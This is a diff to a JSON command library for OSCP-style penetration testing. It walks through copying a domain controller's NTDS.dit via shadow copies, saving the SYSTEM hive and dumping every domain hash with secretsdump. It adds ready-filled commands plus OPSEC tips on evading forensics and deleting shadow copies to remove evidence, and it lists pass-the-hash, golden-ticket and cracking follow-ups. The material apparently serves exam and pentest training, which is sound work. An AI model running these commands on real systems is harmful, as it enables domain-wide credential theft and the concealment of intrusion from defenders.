@@ -31,7 +31,13 @@
         "ad-copy-ntds-from-shadow",
         "ad-vssadmin-create-shadow"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ENUMERATION", "VSS", "SHADOW_COPY", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "VSS",
+        "SHADOW_COPY",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
       "notes": "ALWAYS run this first before creating new shadow copies - existing snapshots save time and reduce forensic footprint. OPSEC: Read-only operation, minimal event logging. TIME: <5 seconds. EXAM TIP: If shadow copies exist from Windows Backup/Server Manager, use those instead of creating new ones. Shadow Copy Device path format: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{NUMBER} - increment NUMBER (1, 2, 3...) for multiple copies."
     },
@@ -68,9 +74,15 @@
       "alternatives": [
         "ad-dcsync-ntds-credentials"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ENUMERATION", "VSS", "PREREQUISITES", "OSCP:MEDIUM"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "VSS",
+        "PREREQUISITES",
+        "OSCP:MEDIUM"
+      ],
       "oscp_relevance": "medium",
-      "notes": "PREREQUISITE check before shadow copy operations. TIME: <3 seconds. VSS enabled by default on Windows Server and Windows 10/11. If stopped, starting requires Administrator. MANUAL ALTERNATIVE: PowerShell: Get-Service -Name VSS | Select-Object Status, StartType, DisplayName. GUI: services.msc → Volume Shadow Copy → Status column."
+      "notes": "PREREQUISITE check before shadow copy operations. TIME: <3 seconds. VSS enabled by default on Windows Server and Windows 10/11. If stopped, starting requires Administrator. MANUAL ALTERNATIVE: PowerShell: Get-Service -Name VSS | Select-Object Status, StartType, DisplayName. GUI: services.msc \u2192 Volume Shadow Copy \u2192 Status column."
     },
     {
       "id": "ad-vssadmin-create-shadow",
@@ -120,9 +132,17 @@
         "ad-vshadow-create-shadow",
         "ad-diskshadow-create-shadow"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "VSS", "SHADOW_COPY", "CREDENTIAL_ACCESS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "VSS",
+        "SHADOW_COPY",
+        "CREDENTIAL_ACCESS",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "PREFERRED METHOD for OSCP exam - native tool, no upload required, faster than transferring vshadow.exe. OPSEC: Persistent shadow copy (survives reboot) - DELETE after extraction with vssadmin delete. TIME: 10-30 seconds for creation. EXAM STRATEGY: (1) Check existing shadows first, (2) Use vssadmin if no vshadow.exe available, (3) Remember to cleanup. LIMITATION: Cannot disable VSS writers like vshadow.exe -nw, slightly slower creation. ADVANTAGE: Zero file transfer, works on all Windows Server versions, less suspicious process execution. Shadow copies consume disk space - ~10-30% of volume size, ensure adequate free space."
+      "notes": "PREFERRED METHOD for OSCP exam - native tool, no upload required, faster than transferring vshadow.exe. OPSEC: Persistent shadow copy (survives reboot) - DELETE after extraction with vssadmin delete. TIME: 10-30 seconds for creation. EXAM STRATEGY: (1) Check existing shadows first, (2) Use vssadmin if no vshadow.exe available, (3) Remember to cleanup. LIMITATION: Cannot disable VSS writers like vshadow.exe -nw, slightly slower creation. ADVANTAGE: Zero file transfer, works on all Windows Server versions, less suspicious process execution. Shadow copies consume disk space - ~10-30% of volume size, ensure adequate free space.",
+      "filled_example": "vssadmin create shadow /for=C:"
     },
     {
       "id": "ad-vshadow-create-shadow",
@@ -142,7 +162,7 @@
       "flag_explanations": {
         "-nw": "No-writers option. Disables VSS writers (application-aware snapshot components). ADVANTAGE: Significantly speeds up shadow copy creation (seconds vs minutes). SAFE for NTDS.dit extraction - database consistency handled by AD itself. Writers only needed for application-level consistency (SQL, Exchange). EXAM TIP: Always use -nw for speed.",
         "-p": "Persistent shadow copy. Stores copy on disk (survives reboot), not in-memory. REQUIRED for file extraction - allows copy operations from shadow device. Alternative: -t (transportable) for backup scenarios.",
-        "vshadow.exe": "Microsoft signed binary from Windows SDK. REQUIRES UPLOAD to target DC. Download: Windows SDK → Debugging Tools → vshadow.exe (x64/x86). Bypasses UAC due to Microsoft signature. ALTERNATIVE: vssadmin (built-in, no upload)."
+        "vshadow.exe": "Microsoft signed binary from Windows SDK. REQUIRES UPLOAD to target DC. Download: Windows SDK \u2192 Debugging Tools \u2192 vshadow.exe (x64/x86). Bypasses UAC due to Microsoft signature. ALTERNATIVE: vssadmin (built-in, no upload)."
       },
       "success_indicators": [
         "Shadow copy set succesfully created",
@@ -157,7 +177,7 @@
         "Insufficient storage"
       ],
       "troubleshooting": {
-        "Access is denied": "Requires Administrator. Verify: net user %USERNAME% | findstr /C:\"Local Group Memberships\". Run from elevated prompt: Right-click cmd.exe → Run as administrator",
+        "Access is denied": "Requires Administrator. Verify: net user %USERNAME% | findstr /C:\"Local Group Memberships\". Run from elevated prompt: Right-click cmd.exe \u2192 Run as administrator",
         "Unexpected error calling routine CoCreateInstance": "VSS COM components initialization failed. Check VSS service: sc query vss. If stopped, start: net start vss. Verify COM registration: vssadmin list providers. If no providers, VSS installation corrupt - use vssadmin instead.",
         "Insufficient storage": "Shadow copy storage area full. Check: vssadmin list shadowstorage /for=C:. Resize: vssadmin resize shadowstorage /for=C: /maxsize=20GB. Or delete old shadows: vssadmin delete shadows /for=C: /oldest",
         "vshadow.exe is not recognized": "Binary not in current directory or PATH. Verify: dir vshadow.exe. If missing, re-upload or specify full path: C:\\Tools\\vshadow.exe -nw -p C:"
@@ -172,9 +192,17 @@
         "ad-vssadmin-create-shadow",
         "ad-diskshadow-create-shadow"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "VSS", "SHADOW_COPY", "CREDENTIAL_ACCESS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "VSS",
+        "SHADOW_COPY",
+        "CREDENTIAL_ACCESS",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "METHOD FROM OFFICIAL OSCP CONTENT. ADVANTAGE: -nw flag speeds up creation significantly (5-10 seconds vs 30-60 seconds). DISADVANTAGE: Requires upload of vshadow.exe to target DC. TIME: Upload (10-30 sec) + Creation (5-10 sec) = 15-40 sec total. OPSEC: Microsoft signed binary, but file transfer creates forensic artifact. EXAM STRATEGY: Use vssadmin if vshadow.exe not available/uploaded. Download vshadow.exe: Part of Windows SDK (free), typically in C:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\vshadow.exe on dev machines. Note device name from output (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{NUMBER}) for copy command."
+      "notes": "METHOD FROM OFFICIAL OSCP CONTENT. ADVANTAGE: -nw flag speeds up creation significantly (5-10 seconds vs 30-60 seconds). DISADVANTAGE: Requires upload of vshadow.exe to target DC. TIME: Upload (10-30 sec) + Creation (5-10 sec) = 15-40 sec total. OPSEC: Microsoft signed binary, but file transfer creates forensic artifact. EXAM STRATEGY: Use vssadmin if vshadow.exe not available/uploaded. Download vshadow.exe: Part of Windows SDK (free), typically in C:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\vshadow.exe on dev machines. Note device name from output (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{NUMBER}) for copy command.",
+      "filled_example": "vshadow.exe -nw -p C:"
     },
     {
       "id": "ad-diskshadow-create-shadow",
@@ -212,7 +240,7 @@
         "The system cannot find the file specified": "Script file path invalid or not found. Verify: type <SCRIPT_FILE>. Check absolute path used (relative paths may fail). Create script: echo set context persistent nowriters > C:\\Temp\\shadow.txt && echo add volume C: >> C:\\Temp\\shadow.txt && echo create >> C:\\Temp\\shadow.txt",
         "Access is denied": "Requires Administrator. Run from elevated prompt. Verify script file location is writable (avoid C:\\Windows\\System32, use C:\\Temp or C:\\Windows\\Temp).",
         "Error during shadow copy creation": "Script syntax error. Common issues: (1) Missing 'set context' before 'create', (2) No volume added ('add volume' required), (3) Metadata path invalid. Test script manually: Run diskshadow.exe interactively, paste commands one-by-one.",
-        "The specified volume is not supported": "Volume type not shadow-compatible (network drive, removable media). Use local NTFS volume only. List valid volumes: diskshadow → list volumes → exit"
+        "The specified volume is not supported": "Volume type not shadow-compatible (network drive, removable media). Use local NTFS volume only. List valid volumes: diskshadow \u2192 list volumes \u2192 exit"
       },
       "prerequisites": [
         "ad-check-vss-service"
@@ -224,9 +252,18 @@
         "ad-vssadmin-create-shadow",
         "ad-vshadow-create-shadow"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "VSS", "SHADOW_COPY", "CREDENTIAL_ACCESS", "AUTOMATION", "OSCP:MEDIUM"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "VSS",
+        "SHADOW_COPY",
+        "CREDENTIAL_ACCESS",
+        "AUTOMATION",
+        "OSCP:MEDIUM"
+      ],
       "oscp_relevance": "medium",
-      "notes": "ADVANCED METHOD - scriptable and automatable. ADVANTAGE: Native Windows tool (no upload), more powerful than vssadmin (can expose shadow as drive letter Z:, easier than \\\\?\\GLOBALROOT paths). EXAM USE CASE: Multi-DC environments where repeatable process needed. TIME: Script creation (30 sec) + Execution (10-20 sec). SCRIPT TEMPLATE:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\metadata.cab\nadd volume C:\ncreate\n\nOPTIONAL: Expose shadow as drive letter for easier access:\nexpose %vssc% Z:\n(Then access files as Z:\\Windows\\NTDS\\ntds.dit instead of \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS\\ntds.dit)\n\nLIMITATION: More complex than vssadmin single command. OPSEC: Native tool, minimal logging. Cleanup: Delete exposed drives with: diskshadow → unexpose Z: → delete shadows volume C: → exit"
+      "notes": "ADVANCED METHOD - scriptable and automatable. ADVANTAGE: Native Windows tool (no upload), more powerful than vssadmin (can expose shadow as drive letter Z:, easier than \\\\?\\GLOBALROOT paths). EXAM USE CASE: Multi-DC environments where repeatable process needed. TIME: Script creation (30 sec) + Execution (10-20 sec). SCRIPT TEMPLATE:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\metadata.cab\nadd volume C:\ncreate\n\nOPTIONAL: Expose shadow as drive letter for easier access:\nexpose %vssc% Z:\n(Then access files as Z:\\Windows\\NTDS\\ntds.dit instead of \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS\\ntds.dit)\n\nLIMITATION: More complex than vssadmin single command. OPSEC: Native tool, minimal logging. Cleanup: Delete exposed drives with: diskshadow \u2192 unexpose Z: \u2192 delete shadows volume C: \u2192 exit",
+      "filled_example": "diskshadow /s C:\\Windows\\Temp\\shadow.txt"
     },
     {
       "id": "ad-wmic-create-shadow",
@@ -276,9 +313,18 @@
         "ad-vshadow-create-shadow",
         "ad-diskshadow-create-shadow"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "VSS", "SHADOW_COPY", "LEGACY", "WMIC", "OSCP:LOW"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "VSS",
+        "SHADOW_COPY",
+        "LEGACY",
+        "WMIC",
+        "OSCP:LOW"
+      ],
       "oscp_relevance": "low",
-      "notes": "LEGACY METHOD - wmic deprecated, not available on modern Windows (10 21H1+, Server 2022+). ONLY USE: Older lab machines (Server 2012/2016), Windows 7/8/10 pre-21H1. EXAM RELEVANCE: LOW - OSCP labs may have newer systems without wmic. PREFER: vssadmin (native, supported) or PowerShell alternatives. TIME: 5-10 seconds. OPSEC: WMIC usage heavily logged (Process Creation Event 4688, WMI Activity 5857-5861). MODERN ALTERNATIVE: PowerShell: Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'C:\\','ClientAccessible' OR Get-CimClass Win32_ShadowCopy | Invoke-CimMethod -MethodName Create -Arguments @{Volume='C:\\'} (CIM cmdlets preferred over WMI). After creation, list shadow copies to get device path: wmic shadowcopy list brief OR vssadmin list shadows"
+      "notes": "LEGACY METHOD - wmic deprecated, not available on modern Windows (10 21H1+, Server 2022+). ONLY USE: Older lab machines (Server 2012/2016), Windows 7/8/10 pre-21H1. EXAM RELEVANCE: LOW - OSCP labs may have newer systems without wmic. PREFER: vssadmin (native, supported) or PowerShell alternatives. TIME: 5-10 seconds. OPSEC: WMIC usage heavily logged (Process Creation Event 4688, WMI Activity 5857-5861). MODERN ALTERNATIVE: PowerShell: Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'C:\\','ClientAccessible' OR Get-CimClass Win32_ShadowCopy | Invoke-CimMethod -MethodName Create -Arguments @{Volume='C:\\'} (CIM cmdlets preferred over WMI). After creation, list shadow copies to get device path: wmic shadowcopy list brief OR vssadmin list shadows",
+      "filled_example": "wmic shadowcopy call create Volume=C:\\"
     },
     {
       "id": "ad-copy-ntds-from-shadow",
@@ -318,7 +364,7 @@
         "0 file(s) copied"
       ],
       "troubleshooting": {
-        "The system cannot find the file specified": "Shadow device path incorrect. VERIFY: (1) Shadow number: vssadmin list shadows → Look for 'Shadow copy device name' → Extract number (e.g., HarddiskVolumeShadowCopy2 = number 2). (2) NTDS.dit path: May vary if custom installation. Check: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\Windows\\NTDS. If not found, search: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\ /s /b | findstr ntds.dit",
+        "The system cannot find the file specified": "Shadow device path incorrect. VERIFY: (1) Shadow number: vssadmin list shadows \u2192 Look for 'Shadow copy device name' \u2192 Extract number (e.g., HarddiskVolumeShadowCopy2 = number 2). (2) NTDS.dit path: May vary if custom installation. Check: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\Windows\\NTDS. If not found, search: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\ /s /b | findstr ntds.dit",
         "Access is denied": "Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr Backup. If privilege disabled, enable with PowerShell: Enable-ProcessPrivilege SeBackupPrivilege. Or run from Administrator account: runas /user:Administrator cmd",
         "The system cannot find the path specified": "Output directory doesn't exist. Create first: mkdir C:\\Temp (or use existing directory like C:\\Users\\Public). Verify destination writable: echo test > <OUTPUT_PATH>_test.txt && del <OUTPUT_PATH>_test.txt",
         "0 file(s) copied": "Silent failure. Check: (1) Destination path valid (no trailing backslash for file), (2) Sufficient disk space: dir C:\\ (check bytes free), (3) NTDS.dit exists in shadow: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy<N>\\Windows\\NTDS\\ntds.dit"
@@ -331,9 +377,16 @@
         "ad-reg-save-system-hive",
         "ad-secretsdump-parse-ntds"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "CREDENTIAL_ACCESS", "NTDS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "CREDENTIAL_ACCESS",
+        "NTDS",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "CRITICAL STEP for offline NTDS.dit credential extraction. TIME: 5-30 seconds (depends on file size, typically 20-500 MB). EXAM TIP: Note shadow copy number from vssadmin list shadows output - easiest to copy-paste device name rather than type manually. OPSEC: File copy generates minimal events, but extracted NTDS.dit is obvious IOC if found. Delete after parsing: del <OUTPUT_PATH>. FILE SIZE VALIDATION: NTDS.dit typically 20+ MB minimum (even small domains). If <1 MB, copy failed or wrong file. ALTERNATIVE PATHS: (1) Custom installation: Check HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\\"Database log files path\". (2) IFM backup: C:\\Windows\\IFM\\ntds.dit (if Install From Media used). TRANSFER TO KALI: SMB share, certutil base64 encoding, impacket-smbserver, or simple Python HTTP server: python3 -m http.server 8080 (then wget from Kali)."
+      "notes": "CRITICAL STEP for offline NTDS.dit credential extraction. TIME: 5-30 seconds (depends on file size, typically 20-500 MB). EXAM TIP: Note shadow copy number from vssadmin list shadows output - easiest to copy-paste device name rather than type manually. OPSEC: File copy generates minimal events, but extracted NTDS.dit is obvious IOC if found. Delete after parsing: del <OUTPUT_PATH>. FILE SIZE VALIDATION: NTDS.dit typically 20+ MB minimum (even small domains). If <1 MB, copy failed or wrong file. ALTERNATIVE PATHS: (1) Custom installation: Check HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\\"Database log files path\". (2) IFM backup: C:\\Windows\\IFM\\ntds.dit (if Install From Media used). TRANSFER TO KALI: SMB share, certutil base64 encoding, impacket-smbserver, or simple Python HTTP server: python3 -m http.server 8080 (then wget from Kali).",
+      "filled_example": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit.bak"
     },
     {
       "id": "ad-reg-save-system-hive",
@@ -367,7 +420,7 @@
         "The parameter is incorrect"
       ],
       "troubleshooting": {
-        "Access is denied": "Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr SeBackupPrivilege. If disabled, enable: Enable-ProcessPrivilege SeBackupPrivilege (PowerShell). Or run elevated prompt: Right-click cmd → Run as administrator.",
+        "Access is denied": "Requires Administrator OR SeBackupPrivilege. Verify: whoami /priv | findstr SeBackupPrivilege. If disabled, enable: Enable-ProcessPrivilege SeBackupPrivilege (PowerShell). Or run elevated prompt: Right-click cmd \u2192 Run as administrator.",
         "The system cannot find the path specified": "Output directory doesn't exist. Create: mkdir C:\\Temp OR use existing: C:\\Windows\\Temp, C:\\Users\\Public. Path must be absolute, not relative.",
         "The process cannot access the file": "Output file already exists and locked/in-use. Delete first: del <OUTPUT_PATH> /F. Or use different filename: system2.bak, system_<timestamp>.bak",
         "The parameter is incorrect": "Invalid registry path or output path. VERIFY: (1) Hive path format: HKLM\\SYSTEM (correct) not HKEY_LOCAL_MACHINE\\SYSTEM (fails with reg save). (2) Output path no special chars: Avoid <, >, |, ? in filename."
@@ -378,9 +431,16 @@
       "next_steps": [
         "ad-secretsdump-parse-ntds"
       ],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "CREDENTIAL_ACCESS", "REGISTRY", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "CREDENTIAL_ACCESS",
+        "REGISTRY",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "REQUIRED for NTDS.dit decryption - cannot extract credentials without SYSTEM hive. TIME: 3-10 seconds. EXAM TIP: Save SYSTEM hive IMMEDIATELY after copying NTDS.dit (easy to forget, blocks credential extraction). FILE SIZE: ~8-15 MB typical. If <1 MB, export failed. OPSEC: Low-risk operation, standard admin task. ALTERNATIVE HIVES for different scenarios: (1) Local account extraction (workstation/server): reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak (2) LSA secrets/cached creds: reg save HKLM\\SECURITY security.bak && reg save HKLM\\SYSTEM system.bak (3) Domain Controller: Only SYSTEM needed for NTDS.dit. TRANSFER TO KALI: Same methods as NTDS.dit (SMB, HTTP, certutil). MANUAL ALTERNATIVE (PowerShell): reg export HKLM\\SYSTEM system.reg (creates text .reg file, NOT suitable for secretsdump - must use 'reg save' binary format). CLEANUP: Delete after transfer: del C:\\Temp\\system.bak C:\\Temp\\ntds.dit.bak"
+      "notes": "REQUIRED for NTDS.dit decryption - cannot extract credentials without SYSTEM hive. TIME: 3-10 seconds. EXAM TIP: Save SYSTEM hive IMMEDIATELY after copying NTDS.dit (easy to forget, blocks credential extraction). FILE SIZE: ~8-15 MB typical. If <1 MB, export failed. OPSEC: Low-risk operation, standard admin task. ALTERNATIVE HIVES for different scenarios: (1) Local account extraction (workstation/server): reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak (2) LSA secrets/cached creds: reg save HKLM\\SECURITY security.bak && reg save HKLM\\SYSTEM system.bak (3) Domain Controller: Only SYSTEM needed for NTDS.dit. TRANSFER TO KALI: Same methods as NTDS.dit (SMB, HTTP, certutil). MANUAL ALTERNATIVE (PowerShell): reg export HKLM\\SYSTEM system.reg (creates text .reg file, NOT suitable for secretsdump - must use 'reg save' binary format). CLEANUP: Delete after transfer: del C:\\Temp\\system.bak C:\\Temp\\ntds.dit.bak",
+      "filled_example": "reg save HKLM\\SYSTEM C:\\Temp\\system.bak"
     },
     {
       "id": "ad-secretsdump-parse-ntds",
@@ -406,7 +466,7 @@
       "flag_explanations": {
         "impacket-secretsdump": "Impacket tool for extracting credentials from various sources (NTDS.dit, SAM, LSA, DCSync). Python-based, Kali pre-installed (apt install impacket-scripts). Offline mode parses local files without network access to target.",
         "-ntds": "Path to NTDS.dit database file (transferred from DC). File contains ALL domain objects, credentials, metadata. Binary ESE (Extensible Storage Engine) database format - requires parsing tools (secretsdump, ntdsutil, DSInternals PowerShell module).",
-        "-system": "Path to SYSTEM registry hive (transferred from DC). Provides boot key (syskey) to decrypt NTDS.dit encryption. Boot key → PEK decryption → Individual hash decryption. WITHOUT SYSTEM hive, output shows encrypted hashes (useless).",
+        "-system": "Path to SYSTEM registry hive (transferred from DC). Provides boot key (syskey) to decrypt NTDS.dit encryption. Boot key \u2192 PEK decryption \u2192 Individual hash decryption. WITHOUT SYSTEM hive, output shows encrypted hashes (useless).",
         "LOCAL": "Keyword instructing secretsdump to parse local files (offline mode). NO network connection to target. Alternative modes: DOMAIN/user:password@IP (live DCSync), SAM/SECURITY file parsing. LOCAL mode safest (passive, no network footprint).",
         "Output format": "domain\\username:RID:LMhash:NThash::: (one per line). Example: CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: LMhash field often empty (aad3b...ee = empty LM). NThash is NTLM hash for Pass-the-Hash. Also outputs Kerberos keys (AES256, AES128, DES) for Kerberos attacks."
       },
@@ -431,7 +491,7 @@
         "SYSTEM hive not found": "SYSTEM file path wrong. Verify: file <SYSTEM_FILE> (should show 'MS Windows registry file'). Ensure both files in same directory: ls -lh *.bak",
         "Unable to open NTDS database": "NTDS.dit file corrupted during transfer OR wrong file. VERIFY: (1) File size matches source: sha256sum <NTDS_FILE> (compare with DC copy). (2) File type: file <NTDS_FILE> (should show 'Extensible storage engine'). (3) Re-transfer using different method (SMB vs HTTP vs certutil base64).",
         "Error while parsing SAM hashes": "Using SAM file instead of NTDS.dit (wrong file). NTDS.dit is ESE database, SAM is registry hive (different parsers). For DC: Use -ntds with NTDS.dit. For workstation/server: Use -sam <SAM> -system <SYSTEM> (no -ntds flag).",
-        "No valid credentials found": "SYSTEM hive doesn't match NTDS.dit (from different machine/restore point). Boot key mismatch prevents PEK decryption. FIX: Re-extract BOTH files from SAME shadow copy simultaneously: copy shadow→ntds.dit && reg save→system, transfer together."
+        "No valid credentials found": "SYSTEM hive doesn't match NTDS.dit (from different machine/restore point). Boot key mismatch prevents PEK decryption. FIX: Re-extract BOTH files from SAME shadow copy simultaneously: copy shadow\u2192ntds.dit && reg save\u2192system, transfer together."
       },
       "prerequisites": [
         "ad-copy-ntds-from-shadow",
@@ -439,14 +499,22 @@
       ],
       "next_steps": [],
       "alternatives": [],
-      "tags": ["ACTIVE_DIRECTORY", "EXPLOITATION", "CREDENTIAL_ACCESS", "NTDS", "OFFLINE_PARSING", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "EXPLOITATION",
+        "CREDENTIAL_ACCESS",
+        "NTDS",
+        "OFFLINE_PARSING",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "FINAL STEP - extracts ALL domain credentials offline. TIME: 10-60 seconds (depends on domain size, number of users). EXAM TIP: Pipe output to file for easy reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt. OUTPUT PARSING: (1) NTLM hashes: Fourth field (domain\\user:RID:LM:NTLM:::) - use for Pass-the-Hash. (2) krbtgt hash: CRITICAL for Golden Ticket (RID 502). (3) Kerberos keys: Below main output, AES256 preferred for Kerberos attacks. (4) Machine accounts: End with $ (DC1$, WEB04$) - usually not crackable. CREDENTIAL USAGE: (1) Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (NTLM mode 1000). (2) Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target. (3) Golden Ticket: Use krbtgt hash. (4) AS-REP Roasting: Already have hashes, but Kerberos keys useful for forging tickets. FILE CLEANUP: shred -vfz ntds.dit.bak system.bak (secure delete on Kali). ALTERNATIVE TOOLS: (1) DSInternals (PowerShell): Get-ADDBAccount -All -DatabasePath ntds.dit -BootKey <bootkey>. (2) ntdsutil: Native Windows, extract to IFM format. (3) gosecretsdump: Golang version (faster for huge domains). HASH FORMAT: LM hash deprecated (aad3b...ee = empty), focus on NTLM (32 hex chars). Empty NTLM (31d6cfe0...) = blank password."
+      "notes": "FINAL STEP - extracts ALL domain credentials offline. TIME: 10-60 seconds (depends on domain size, number of users). EXAM TIP: Pipe output to file for easy reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt. OUTPUT PARSING: (1) NTLM hashes: Fourth field (domain\\user:RID:LM:NTLM:::) - use for Pass-the-Hash. (2) krbtgt hash: CRITICAL for Golden Ticket (RID 502). (3) Kerberos keys: Below main output, AES256 preferred for Kerberos attacks. (4) Machine accounts: End with $ (DC1$, WEB04$) - usually not crackable. CREDENTIAL USAGE: (1) Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt (NTLM mode 1000). (2) Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target. (3) Golden Ticket: Use krbtgt hash. (4) AS-REP Roasting: Already have hashes, but Kerberos keys useful for forging tickets. FILE CLEANUP: shred -vfz ntds.dit.bak system.bak (secure delete on Kali). ALTERNATIVE TOOLS: (1) DSInternals (PowerShell): Get-ADDBAccount -All -DatabasePath ntds.dit -BootKey <bootkey>. (2) ntdsutil: Native Windows, extract to IFM format. (3) gosecretsdump: Golang version (faster for huge domains). HASH FORMAT: LM hash deprecated (aad3b...ee = empty), focus on NTLM (32 hex chars). Empty NTLM (31d6cfe0...) = blank password.",
+      "filled_example": "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"
     },
     {
       "id": "ad-vssadmin-delete-shadows",
       "name": "Delete Shadow Copies (Cleanup)",
-      "category": "cleanup",
+      "category": "utilities",
       "subcategory": "active-directory",
       "command": "vssadmin delete shadows /for=<DRIVE_LETTER>: /all /quiet",
       "description": "Remove all shadow copies from target volume to cleanup forensic artifacts after NTDS.dit extraction.",
@@ -479,22 +547,30 @@
         "Access is denied": "Requires Administrator. Verify: whoami /groups | findstr Administrators. Run from elevated prompt. Note: Even Backup Operators cannot delete shadows (creation/read only) - Administrator required for deletion.",
         "No shadow copies were found": "Either (1) Already deleted, (2) Wrong drive letter, (3) Shadows on different volume. VERIFY: vssadmin list shadows (shows all shadows across all volumes). Check correct drive: vssadmin list shadows | findstr /C:\"Original Volume name\"",
         "Error deleting shadow copies": "Shadow copy in use (open file handle or backup operation). SOLUTIONS: (1) Close any open files from shadow: Close Explorer windows accessing \\\\?\\GLOBALROOT\\Device\\... paths. (2) Wait for backup operations: vssadmin list writers (check writer state). (3) Force delete specific shadow: vssadmin delete shadows /shadow={ShadowID} /quiet",
-        "The shadow copy was not found": "Shadow ID invalid (if using /shadow= flag). List valid IDs: vssadmin list shadows → Copy GUID from 'Shadow Copy ID: {GUID}'. Use /all instead of specific ID for bulk deletion."
+        "The shadow copy was not found": "Shadow ID invalid (if using /shadow= flag). List valid IDs: vssadmin list shadows \u2192 Copy GUID from 'Shadow Copy ID: {GUID}'. Use /all instead of specific ID for bulk deletion."
       },
       "prerequisites": [
         "ad-secretsdump-parse-ntds"
       ],
       "next_steps": [],
       "alternatives": [],
-      "tags": ["ACTIVE_DIRECTORY", "CLEANUP", "VSS", "SHADOW_COPY", "OPSEC", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "CLEANUP",
+        "VSS",
+        "SHADOW_COPY",
+        "OPSEC",
+        "OSCP:HIGH"
+      ],
       "oscp_relevance": "high",
-      "notes": "CRITICAL OPSEC STEP - remove evidence of shadow copy abuse. TIME: 5-15 seconds. EXAM CONSIDERATION: Delete shadows AFTER credentials extracted and files transferred to Kali. Don't delete prematurely (may need to re-extract if transfer fails). DISK SPACE: Shadow copies consume 10-30% of volume size - deletion frees significant space. FORENSIC EVIDENCE: Shadow copy creation logs Event ID 8222 (VSS), usage logs 4663 (file access), deletion logs 8224. Deletion removes snapshots but NOT event logs (requires log clearing). ALTERNATIVES: (1) Delete oldest only: vssadmin delete shadows /for=C: /oldest /quiet (preserve recent shadows for legitimate backup). (2) Delete specific shadow: vssadmin delete shadows /shadow={GUID} (from vssadmin list shadows output). (3) PowerShell: Get-WmiObject Win32_ShadowCopy | Where-Object {$_.VolumeName -eq 'C:\\\\'} | ForEach-Object {$_.Delete()}. RANSOMWARE TECHNIQUE: Attackers often delete shadows to prevent recovery (vssadmin delete shadows /all /quiet). Blue team IOC: Unexpected shadow deletion, especially with /quiet flag. EXAM STRATEGY: Trade-off between stealth (delete shadows) vs backup (keep shadows for re-extraction if needed). Recommend: Keep shadows until final credential validation, then delete before moving to next target."
